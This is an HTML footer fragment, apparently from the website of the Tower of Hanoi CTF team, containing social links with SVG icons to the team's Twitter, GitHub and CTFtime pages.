<div class="social-links" data-astro-cid-sz7xmlte> <a href="https://twitter.com/towerofhanoi" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Follow Tower of Hanoi on Twitter</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/twitter" data-astro-cid-sz7xmlte><path fill="currentColor" d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" data-astro-cid-sz7xmlte></path></svg> </a> <a href="https://github.com/towerofhanoi" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Go to Tower of Haoi's GitHub repo</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/github" data-astro-cid-sz7xmlte><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-sz7xmlte></path></svg> </a> <a href="https://ctftime.org/team/300" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Go to Tower of Hanoi's CTF Time page</span> <svg viewBox="0 0 16 16" width="32" height="32" data-astro-cid-sz7xmlte> <path fill="currentColor" d="M 0,0 H 16 V 16 H 0 L 4.7205698,7.7838485 Z" data-astro-cid-sz7xmlte></path> </svg> </a> </div> </footer>  </body></html>